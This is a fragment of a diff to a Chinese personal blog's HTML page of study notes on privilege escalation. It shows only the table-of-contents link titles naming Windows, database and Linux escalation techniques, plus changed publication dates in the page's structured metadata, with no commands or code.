href="#2-sc%E6%8F%90%E6%9D%83"><span class="toc-text">2.sc提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ps%E6%8F%90%E6%9D%83"><span class="toc-text">3.ps提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows2008-amp-7-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E5%8D%87"><span class="toc-text">Windows2008&amp;7 令牌窃取提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows2003-amp-10-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87"><span class="toc-text">Windows2003&amp;10 进程注入提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-text">烂土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-text">不带引号服务路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-text">不安全的服务权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-text">数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL"><span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%BA%90%E7%A0%81"><span class="toc-text">1.本地源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E6%88%96%E8%80%85%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toc-text">2.数据库存储或者备份文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">3.暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-UDF%E6%8F%90%E6%9D%83"><span class="toc-text">4.UDF提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-MOF%E6%8F%90%E6%9D%83"><span class="toc-text">5.MOF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8"><span class="toc-text">手动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-MSF-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-text">6.MSF+启动项提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-cmdshell%E6%8F%90%E6%9D%83"><span class="toc-text">xp_cmdshell提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sp-oacreate%E6%8F%90%E6%9D%83"><span class="toc-text">sp_oacreate提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-text">沙盒提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%8F%90%E6%9D%83"><span class="toc-text">Redis提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9-shell"><span class="toc-text">利用计划任务执行命令反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99-ssh-keygen-%E5%85%AC%E9%92%A5%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E7%A7%81%E9%92%A5%E7%99%BB%E9%99%86"><span class="toc-text">写 ssh-keygen 公钥然后使用私钥登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-text">写webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">内核溢出漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-text">脏牛提权</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3674,7 +3791,7 @@ web渗透访问123.58.224.8:33067
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Blogs for JiangA23187"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/学习笔记/","name":"学习笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/05/30/提权/","name":"权限提升"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Blogs for JiangA23187","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"权限提升","description":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/05/30/%E6%8F%90%E6%9D%83/"},"author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/05/30/%E6%8F%90%E6%9D%83/","wordCount":0,"datePublished":"2022-05-30T12:30:29.515Z","dateModified":"2022-10-09T11:39:17.587Z","articleSection":"学习笔记","keywords":"权限提升","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Blogs for JiangA23187"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/学习笔记/","name":"学习笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/10/09/提权/","name":"权限提升"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Blogs for JiangA23187","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"权限提升","description":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/"},"author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/","wordCount":0,"datePublished":"2022-10-08T16:00:00.000Z","dateModified":"2022-10-10T09:13:55.307Z","articleSection":"学习笔记","keywords":"权限提升","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
